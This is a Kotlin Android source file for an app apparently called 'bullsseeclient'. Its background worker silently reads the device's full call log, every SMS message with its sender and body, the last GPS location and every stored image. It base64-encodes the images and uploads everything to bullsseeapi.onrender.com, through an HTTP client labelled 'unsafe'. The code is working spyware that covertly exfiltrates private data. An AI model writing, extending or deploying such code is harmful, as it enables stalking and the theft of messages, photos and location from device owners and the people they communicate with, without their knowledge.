package com.example.bullsseeclient

import android.content.Context
import android.provider.CallLog
import android.provider.Telephony
import android.provider.MediaStore // Added for MediaStore
import android.graphics.Bitmap
import android.graphics.BitmapFactory // Added for BitmapFactory
import android.location.LocationManager
import android.util.Log
import androidx.core.content.ContextCompat.getSystemService
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.POST
import java.io.ByteArrayOutputStream
import java.time.Instant
import java.util.UUID // Added for UUID

class DataCollectionWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {
    private val deviceName = params.inputData.getString("deviceName") ?: UUID.randomUUID().toString()
    private val gson = Gson()

    data class CallLogData(val deviceName: String, val number: String, val date: String)
    data class SmsLogData(val deviceName: String, val address: String, val body: String, val date: String)
    data class LocationLogData(val deviceName: String, val latitude: Double, val longitude: Double, val timestamp: String)
    data class CameraImageData(val deviceName: String, val base64Image: String, val timestamp: String)

    override fun doWork(): Result {
        Log.d("DataCollectionWorker", "Worker started for deviceName=$deviceName")
        val data = DataCollection(applicationContext, deviceName)
        sendDataToApi(data)
        return Result.success()
    }

    private fun sendDataToApi(data: DataCollection) {
        val retrofit = Retrofit.Builder()
            .baseUrl("https://bullsseeapi.onrender.com/") // Match MainActivity's URL
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(ApiService::class.java)

        // Call Logs
        Log.d("DataCollectionWorker", "Collecting call logs: size=${data.callLogs?.size ?: 0}")
        if (data.callLogs?.isNotEmpty() == true) {
            try {
                val body = RequestBody.create("application/json".toMediaType(), gson.toJson(data.callLogs))
                val call = apiService.sendCallLogs(body)
                call.enqueue(object : retrofit2.Callback<Void> {
                    override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                        if (response.isSuccessful) {
                            Log.d("DataCollectionWorker", "Call logs sent successfully: status=${response.code()}")
                        } else {
                            Log.e("DataCollectionWorker", "Call logs failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                        }
                    }
                    override fun onFailure(call: Call<Void>, t: Throwable) {
                        Log.e("DataCollectionWorker", "Call logs failed: error=${t.message}")
                    }
                })
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Error sending call logs: ${e.message}")
            }
        }

        // SMS Logs
        Log.d("DataCollectionWorker", "Collecting SMS logs: size=${data.smsLogs?.size ?: 0}")
        if (data.smsLogs?.isNotEmpty() == true) {
            try {
                val body = RequestBody.create("application/json".toMediaType(), gson.toJson(data.smsLogs))
                val call = apiService.sendSmsLogs(body)
                call.enqueue(object : retrofit2.Callback<Void> {
                    override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                        if (response.isSuccessful) {
                            Log.d("DataCollectionWorker", "SMS logs sent successfully: status=${response.code()}")
                        } else {
                            Log.e("DataCollectionWorker", "SMS logs failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                        }
                    }
                    override fun onFailure(call: Call<Void>, t: Throwable) {
                        Log.e("DataCollectionWorker", "SMS logs failed: error=${t.message}")
                    }
                })
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Error sending SMS logs: ${e.message}")
            }
        }

        // Location Logs
        Log.d("DataCollectionWorker", "Collecting location logs: size=${data.locationLogs?.size ?: 0}")
        if (data.locationLogs?.isNotEmpty() == true) {
            try {
                val body = RequestBody.create("application/json".toMediaType(), gson.toJson(data.locationLogs))
                val call = apiService.sendLocationLogs(body)
                call.enqueue(object : retrofit2.Callback<Void> {
                    override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                        if (response.isSuccessful) {
                            Log.d("DataCollectionWorker", "Location logs sent successfully: status=${response.code()}")
                        } else {
                            Log.e("DataCollectionWorker", "Location logs failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                        }
                    }
                    override fun onFailure(call: Call<Void>, t: Throwable) {
                        Log.e("DataCollectionWorker", "Location logs failed: error=${t.message}")
                    }
                })
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Error sending location logs: ${e.message}")
            }
        }

        // Camera Images
        Log.d("DataCollectionWorker", "Collecting camera images: size=${data.cameraImages?.size ?: 0}")
        if (data.cameraImages?.isNotEmpty() == true) {
            try {
                val body = RequestBody.create("application/json".toMediaType(), gson.toJson(data.cameraImages))
                val call = apiService.sendCameraImages(body)
                call.enqueue(object : retrofit2.Callback<Void> {
                    override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
                        if (response.isSuccessful) {
                            Log.d("DataCollectionWorker", "Camera images sent successfully: status=${response.code()}")
                        } else {
                            Log.e("DataCollectionWorker", "Camera images failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                        }
                    }
                    override fun onFailure(call: Call<Void>, t: Throwable) {
                        Log.e("DataCollectionWorker", "Camera images failed: error=${t.message}")
                    }
                })
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Error sending camera images: ${e.message}")
            }
        }
    }

    interface ApiService {
        @POST("api/DeviceData/calllog")
        fun sendCallLogs(@Body data: RequestBody): Call<Void>

        @POST("api/DeviceData/smslog")
        fun sendSmsLogs(@Body data: RequestBody): Call<Void>

        @POST("api/DeviceData/locationlog")
        fun sendLocationLogs(@Body data: RequestBody): Call<Void>

        @POST("api/DeviceData/cameraImage")
        fun sendCameraImages(@Body data: RequestBody): Call<Void>
    }

    class DataCollection(context: Context, deviceName: String) {
        val callLogs: MutableList<CallLogData>? = mutableListOf()
        val smsLogs: MutableList<SmsLogData>? = mutableListOf()
        val locationLogs: MutableList<LocationLogData>? = mutableListOf()
        val cameraImages: MutableList<CameraImageData>? = mutableListOf()

        init {
            try {
                val callCursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
                callCursor?.use { cursor ->
                    while (cursor.moveToNext()) {
                        val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                        callLogs?.add(CallLogData(deviceName, number, Instant.ofEpochMilli(date).toString()))
                    }
                }
                Log.d("DataCollectionWorker", "Call logs collected: size=${callLogs?.size ?: 0}")
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Failed to collect call logs: ${e.message}")
            }

            try {
                val smsCursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
                smsCursor?.use { cursor ->
                    while (cursor.moveToNext()) {
                        val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                        smsLogs?.add(SmsLogData(deviceName, address, body, Instant.ofEpochMilli(date).toString()))
                    }
                }
                Log.d("DataCollectionWorker", "SMS logs collected: size=${smsLogs?.size ?: 0}")
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Failed to collect SMS logs: ${e.message}")
            }

            try {
                val locationManager = getSystemService(context, LocationManager::class.java)
                val location = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (location != null) {
                    locationLogs?.add(LocationLogData(deviceName, location.latitude, location.longitude, Instant.now().toString()))
                }
                Log.d("DataCollectionWorker", "Location logs collected: size=${locationLogs?.size ?: 0}")
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Failed to collect location logs: ${e.message}")
            }

            try {
                val cursor = context.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null)
                cursor?.use { c ->
                    while (c.moveToNext()) {
                        val dataColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                        val path = c.getString(dataColumn)
                        val bitmap = BitmapFactory.decodeFile(path) // Using BitmapFactory
                        val baos = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos)
                        val imageBytes = baos.toByteArray()
                        val base64Image = android.util.Base64.encodeToString(imageBytes, android.util.Base64.DEFAULT)
                        cameraImages?.add(CameraImageData(deviceName, base64Image, Instant.now().toString()))
                    }
                }
                Log.d("DataCollectionWorker", "Camera images collected: size=${cameraImages?.size ?: 0}")
            } catch (e: Exception) {
                Log.e("DataCollectionWorker", "Failed to collect camera images: ${e.message}")
            }
        }
    }
}